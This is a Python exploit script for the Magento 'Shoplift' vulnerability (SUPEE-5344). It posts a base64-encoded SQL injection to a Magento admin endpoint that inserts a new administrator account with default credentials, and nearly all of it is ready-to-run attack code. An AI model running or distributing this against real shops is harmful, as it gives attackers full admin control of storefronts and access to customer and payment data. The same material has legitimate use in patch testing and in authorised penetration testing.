#!/bin/python3

##################################################################################################
#Exploit Title : Magento Shoplift exploit (SUPEE-5344)
#Author        : Erik Serbicki (Spektre) 
#Date          : 06/17/2025
#Debugged At  : Indishell Lab(originally developed by joren)
##################################################################################################

import requests
import base64
import sys
import argparse

# Get url, username, and password from command line
parser = argparse.ArgumentParser(description="Adds an admin user with supplied credentials (if the website is vulnerable: Magento < 1.9.1.1)")
parser.add_argument('url', help="Target url")
parser.add_argument("--username", '-u', help="New admin username")
parser.add_argument("--password", '-p', help="New admin password")
args = parser.parse_args()

target = args.url
username = args.username
password = args.password

if not target.startswith("http"):
    target = "http://" + target

if target.endswith("/"):
    target = target[:-1]

target_url = target + "/index.php/admin/Cms_Wysiwyg/directive/index/"

if username == None:
    print("No username detected.\nSet username with -u flag. Default username set to 'forme'")
    username = "forme"
if password == None:
    print("No password detected.\nSet password with -p flag. Defualt password set to 'forme'")
    password = "forme"

q="""
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""


query = q.replace("\n", "").format(username=username, password=password)
pfilter = f"popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{query}"

# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
r = requests.post(target_url,
                  data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
                        "filter": base64.b64encode(pfilter.encode()),
                        "forwarded": 1})
print(r.status_code)
if r.ok:
    print("WORKED")
    print(f"Check {target}/index.php/admin with creds {username}:{password}")
else:
    print("DID NOT WORK")

